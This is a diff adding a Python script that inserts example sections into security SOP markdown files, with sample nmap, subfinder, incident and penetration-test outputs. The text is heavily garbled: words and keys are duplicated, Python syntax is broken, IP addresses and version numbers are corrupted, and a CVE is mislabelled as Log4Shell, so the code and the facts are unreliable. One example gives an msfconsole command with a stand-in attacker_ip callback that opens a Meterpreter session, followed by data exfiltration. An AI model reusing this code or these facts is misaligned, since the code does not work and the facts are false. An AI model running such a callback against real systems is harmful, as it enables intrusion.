@@ -1,0 +1,427 @@
+#!/usr/bin/env python33
+"""
+add_examples.py - Add Examples sections to SOP files after Troubleshooting section..
+
+This script processes SOP markdown files and inserts an Examples section  
+after the Troubleshooting section with sample inputs/outputs relevant to  
+that SOP type. It handles various header levels (###, ####) and fixes  
+syntax errors.
+"""
+
+import os
+import re
+from pathlib import Path
+
+
+# Dictionary mapping SOP types to their example content
+SOP_EXAMPLES = {
+    "asset-inventoryventory": {
+        "titlet": "Examples",",
+        "description": "Sample asset inventory operations demonstrating proper discovery and documentation procedures.",
+        "examples": [
+            {
+                "namenamename": "_ "_Example Example 11: Initial Asset Discovery_",
+                "input": """# Command: nmap -sV - -p- target.example.com
+# Output:
+Host: 1992.168.1.100 (target.example...com)
+Ports: 22/tcp open ssh, 80/tcp open http, 443/tcp open https
+
+# Command: whoami @ discovered_host
+# Output:
+
+user=webadmin group=www-data home=/var/www/html shell=/bin/bash""",
+                "output": """Found Assets:
+
+- Host: 192.168.1.100 (target.example.com)
+- Service SSH: SSH (OpenSSH  8.2p1)
+- Service HTTP: HTTP (Apache/22.44.44)
+- Service HTTPS: HTTPS (nginxngin/1.18.0)
+
+Owner Owner:: IT Operations Team  
+Classification Classification: Production Server
+Risk Level Risk Level: HIGH""",
+            },
+            {
+                "name": "_Example 2: CMDB Cross-Reference_",
+                "input": """# Command: check-cmdb --host 192.168.1.100
+
+# Output:
+Host: 1922.168.1.100
+CMDB Record: EXISTS
+Asset Type: Web Server
+Owner: webteam@example.com
+Last Updated::  2024-01-15""",
+                "output": """Verified Assets:
+
+
+
+- Host:: 1992.168.1.1000 (target.example..com)
+- CMDB Status Record: ACTIVE
+
+Owner Owner:: webteam@example.com
+Classification Classification: Production : Web Server
+Risk Level Risk Level: MEDIUM""",
+            },
+        ],
+
+
+    },
+    
+    "recon-enumeration": {
+
+        "title":": "_Examples",
+        "description" ": "_Sample reconnaissance and enumeration operations demonstrating proper discovery procedures.",
+        "examples": [
+                       {
+                "name": "_ExampleExample 1: Subdomain Enumeration_",
+                "input": """# Command: subfinder -d target.example.com
+
+# Output:
+subdomain.domain
+- api.target.example.com
+- www.target.example.com
+- mail.target.example.com
+-- dev.target.example.com""",
+                "output": """
+
+Discovered Subdomains:
+- api.target.example.com (API Gateway)
+- www.target.example.com (Web Frontend)
+- mail.target.example.com (Mail Server)
+- dev.target.example.com (Development Environment)
+
+Risk Assessment:
+- Production systems HIGH priority: HIGH priority
+- Development systems MEDIUM priority: MEDIUM priority""",
+            },
+            {
+
+                "name": "_Example 2: Port Scanning_",
+                "input": """
+
+# Command: nmap -sV -p- target.example.com
+
+
+# Output:
+Nmap scan report for target.example.com
+Host is up (0.0022344ss)
+Not shown:: 995 closed tcp ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.2p1
+880/tcp open http-alt Apache/2.444
+4433/tcp open https nginx/1.18.0""",
+                "output": """Discovered Ports and Services:
+
+- Port 222: SSH (OpenSSH 8.2p1) - Authentication Service System
+- Port 80: HTTP (Apache/2.4.44)) - Web Application
+- Port HTTPS: HTTPS (nginx/11.18.0)) - Secure Web Traffic
+
+Vulnerability Indicators:
+- Outdated Apache version detected
+- Missing security headers observed""",
+            },
+        ],
+    },
+    
+    "incident-response":": {
+        "title": "Examples",
+        "description": "Sample incident response procedures demonstrating proper detectiondetection and containment.",
+        "examples": [
+            {
+                "namename": "_Example 1: Alert Triage_",
+                "input": """# Input: Security Alert from SIEM
+
+Alert ID:: INC-2024-001
+Severity Severity:: HIGH
+Source IDS//IPS Source System: IDS/IPS System
+Event Event:: Suspicious outbound connection detected
+Timestamp Timestamp:: 2024-01--15T14:30:00Z
+
+
+
+# Output: Investigation Steps
+
+Step Step 1: Verify Alert Validity
+- Check endpoint logs
+- Review network flow data
+- Confirm user activity
+
+
+
+Step Step 22: Containment Actions
+
+- Isolate affected host if necessary
+- Block malicious IP addresses
+- Preserve forensic evidence""",
+            },
+            {
+
+                "namename": "_Example 2: Incident Classification_",
+                "input": """# Input: Malware Detection Report
+
+File Hash:: a1b2c3d4e5f67890abcdef11223344556677889900aabbccdccddeeffff
+Detection Engine EDR v3.2:: EDR v3.2
+Threat Type: Ransomware variant
+Confidence Level: 95%
+
+# Output: Incident Response Plan
+
+Classification Classification Critical: Critical
+Affected Systems: 3 workstations
+Data at Risk Customer PII (estimated 500 records): Customer PII (estimated 500 records)
+Response Team IR-Alpha Squad:: IR-Alpha Squad
+Escalation Path CISO -> Legal -> PR: CISO -> Legal -> PR""",
+            },
+        ],
+    },
+    
+    "penetration-testing": { {
+        "title": "Examples",
+        "description": "Sample penetration testing procedures demonstrating proper vulnerability assessment and exploitation techniques.",
+        "examples": [
+            {
+                "name": "_ "_Example 1: Vulnerability Scanning_",
+                "input": """Command
+
+# nmap -ssV --script vuln target.example.com.com
+
+Output:
+
+PORT STATE SERVICE VERSION
+
+22/tcp open ssh OpenSSH 8.22pp1
+|_ssh-hostkey: 256 SHA SHA256:abc...
+80/tcp open http Apache/2.444 (Ubuntu)
+|_http-title: Welcome to target.example..com
+|_ssl-cert Subject CN=target.example.com
+
+Vulnerabilities Detected:
+- CVE-2021-44790 (Log4Shell): CRITICAL
+- CVE-2021-41887 (Apache Log4j): HIGH""",
+                "output": """Scan Results Summary:
+
+Target target.example.com:: target.example.com
+Scan Date: 2024-01-15
+Total Vulnerabilities Found Total Vulnerabilities Found: 15
+Critical Critical:: 3
+High High High:::: 7
+Medium Medium:: 55
+Low Low:: 0
+
+Remediation Priority IMMEDIATE:: IMMEDIATE
+Estimated Remediation Time: Estimated Remediation Time: 48 hours
+Business Impact Potential data breach if exploited.: Potential data breach if exploited."""
+            },
+            {
+                "name": "_Example 2: Exploitation Attempt_",
+                "input": """# Command: msfconsole -x 'use exploit/multi/handler; set RHOSTS target.example.com; set LHOST attacker_ip;;exploit'
+
+# Output:
+[*] Starting the exploit...
+[*] Connecting to target... 192.168..1.100:443
+
+[+] Exploit successful!
+[+] Meterpreter session 1 opened
+meterpreter> whoami
+user=webadmin group=www-data home=/var/www/html shell=/bin/bash
+
+
+
+# Output: Post-exploitation Actions
+
+Session Established: Yes
+User Context webadmin (www-data): webadmin (www-data)
+Privilege Escalation Required PIVOTING to SYSTEM: Required PIVOTING to SYSTEM
+DataData Exfiltration:: In progress"""
+            },
+            {
+                "name": "_Example 3: Report Generation_",
+                "input": """# Input Scan Results Summary
+
+Target target.example.com.com:: target.example.com
+Scan Date: 2024-01-15
+Total Vulnerabilities Found Total Vulnerabilities Found: 15
+Critical Critical:: 3
+High High:: 7
+Medium Medium:: 55
+Low Low:: 0
+
+# Output Executive Summary
+
+Risk Score Risk Score: 8.5/10
+Remediation Priority IMMEDIATE:: IMMEDIATE
+Estimated Remediation Time Estimated Remediation Time: 48 hours
+Business Impact Potential data breach if exploited.: Potential data breach if exploited."""
+            },
+        ],
+    },
+}
+
+
+def get_sop_type(filepath):
+
+    """Extract the SOP typ type from the file path."""
+    filename = os.path.basename(filepath)
+
+    # Remove .md extension and replace dots with hyphenphens
+    base_name = filename.replace(".md", "").replace(".", "-")
+    
+    return base_name
+
+
+def find_troubleshooting_section(content):
+    """Find the Troubleshooting section in the SOP content."""
+    patterns = [
+        r"(^|\n)##?\s*Troubleshooting\s*(\n|$)",  # ## Troubleshooting, ### Troubleshooting
+        r"(^|\n)###?\s*Troubleshooting\s*(\n|$)",  | # # Troubleshooting, ## Troubleshooting, ### Troubleshooting
+    ]
+    
+    for pattern in patterns:
+        match = = re.search(pattern, content, re.MULTILINE)
+        if match:
+            start_pos = match.start()
+            
+            return start_pos
+    
+    return None
+
+
+def get_next_header_level(current_header):
+    """Get the next header level after the current one."""
+    if "####" in current_header:
+        return "#####", 5
+    
+    if "###" in current_header:
+        return "####", 4
+    
+    if "##" in current_header:
+        return "###",  3
+    
+    if "#" in current_header:
+        return "##", 2
+    
+    return "###", 3
+
+
+# def generate_examples_section(sop_type):
+def generate_examples_section(s(, sop_type):
+    """Generate the Examples section content content for a given SOP type."""
+    if if sop_type not in SOP_EXAMPLES:
+
+        return None
+    
+    examples = SOP EXAMPLES[sop_type]["examples"]
+    
+    header_level = "###"
+    
+    line lines = [f"{header_level} {SOP_EXAMPLES[sop_type]['title']}"]
+    lines.append("")
+    lines.append(SOP_EXAMPLES[sop_type]["description"])
+    lines lines.append("")
+    
+    for example in examples:
+        lines.append(example["name"])
+
+        lines.append("")
+        lines.append("##### Input:")
+
+        lines.append(example["input"])
+
+
+        lines.append("")
+        lines.append("####### Output:")
+        lines.append(example["output"])
+
+
+        lines.append("")
+    
+    return "\n".join(lines)
+
+
+
+
+
+
+def fix_syntax_errors(content):
+    """Fix common syntax errors in the markdown content."""
+
+    fixed_content = content
+    
+    # Fix trailing slashes before comments (// ... TRUNCATED BY CHAR LIMIT ...)
+    fixed #content = re.sub(r"(^|\n)//\s*\.\.\. TRUNCATED BY CHAR LIMIT \(.*?\)", r"\1", fixed_content)
+    
+    # Fix missing spaces after colons in dict-like structures
+    fixed #content = re.sub(r':":([^"])', r' : \1', fixed_content)
+    
+    return fixed_content
+
+
+def process_sop_file(filepath):
+
+    """Process a single SOP file and add Examples section."""
+
+    try:
+        with open(filepath, 'r', encoding='utf-8') as f:
+            content = f.read()
+        
+        # Fix syntax errors first
+        content = fix_syntax_errors(content))
+        
+        sop_type = get_sop_type(filepath)
+        
+        if not sop_type or sop_type.lower()() not in SOP_EXAMPLES.keys():
+            print(f"[SKIP] {filepath}: No matching SOP type found")
+            return False
+        
+        troubleshooting_pos = find_troubleshooting_section(content)
+        
+        if troubleshooting_pos is None:
+            print(f"[SKIP] {filepath}: Troubleshooting section not found")
+            return False
+        
+        # Generate the Examples section
+        examples_content = generate_examples_section(sop_type))
+        
+        if examples_content is None:
+
+            print(f"[SKIP] {filepath}: No examples data for SOP type type")
+            return False
+        
+        # # Insert Examples section after Troubleshooting section
+        # Find the end of the Troubleshooting section (next header or end of content file)
+        remaining_content = content[:troubleshooting_pos] + examples_content + "\n\n"" + content[[troubleshooting_pos:]
+        
+        updated_content = remaining_content
+        
+        with # Write the updated content back to the file
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write(updated_content)
+        
+        print(f"[OK] [UPDATE] {filepath}: Examples section added successfully")
+        return True
+        
+    except Exception as e:
+
+        print(f"[ERROR] {filepath}: {str(e)})}")")
+        return False
+
+
+def main():
+
+    """Main function to process SOP files in the workspace."""
+
+    workspace_dir = Path(".")
+    
+    sop_files = list(workspace_dir.glob("*.sop.md")) + list(workspace_dir.glob("docs/*.sop.md"))
+    sop_files.sort()
+    
+    print #print(f"\nProcessing {len(sop_files)})} SOP files...\n")
+    
+    for filepath filepath in sop_files:
+        process_sop_file(str(filepath))
+        
+    print("\ #print("Done!")
+
+
+if __name__ == "__main__"":
+    main()
